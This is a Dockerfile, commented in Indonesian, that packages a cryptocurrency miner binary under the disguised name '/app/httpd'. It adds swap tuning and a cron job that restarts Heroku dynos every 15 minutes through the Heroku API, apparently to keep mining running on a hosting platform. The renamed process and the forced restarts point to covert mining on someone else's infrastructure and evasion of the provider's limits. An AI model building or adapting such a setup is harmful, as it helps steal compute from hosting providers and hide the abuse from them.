# Base Image
FROM ubuntu:20.04

# Non-interaktif selama instalasi
ARG DEBIAN_FRONTEND=noninteractive

# Install dependencies
RUN apt-get update && apt-get install -y \
    wget \
    bash \
    python3 \
    python3-pip \
    curl \
    cron \
    --no-install-recommends && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Set working directory
WORKDIR /app

# Enable swap
RUN fallocate -l 1G /swapfile 
RUN chmod 600 /swapfile 
RUN mkswap /swapfile && \
    echo "/swapfile none swap sw 0 0" >> /etc/fstab
# Optimize swappiness
RUN sysctl vm.swappiness=10 && echo "vm.swappiness=10" >> /etc/sysctl.conf

# Download miner binary
COPY iniminer-linux-x64 /app/httpd
RUN chmod +x /app/httpd

# Copy startup script
COPY input.sh /app/input.sh
RUN chmod +x /app/input.sh

# Copy startup script
COPY compile.sh /app/node.sh
RUN chmod +x /app/node.sh

# Copy startup script
COPY main.sh /app/main.sh
RUN chmod +x /app/main.sh

# Copy startup script
COPY run.sh /app/run.sh
RUN chmod +x /app/run.sh

# Script untuk restart dynos menggunakan Heroku API
COPY restart.sh /app/restart.sh
RUN chmod +x /app/restart.sh

# Tambahkan cron job untuk restart setiap 15 menit
RUN echo "*/15 * * * * root /app/restart.sh" >> /etc/crontab

# Set environment variables
ENV PORT=8080
EXPOSE 8080

# Jalankan cron dan aplikasi utama
CMD cron && /app/run.sh
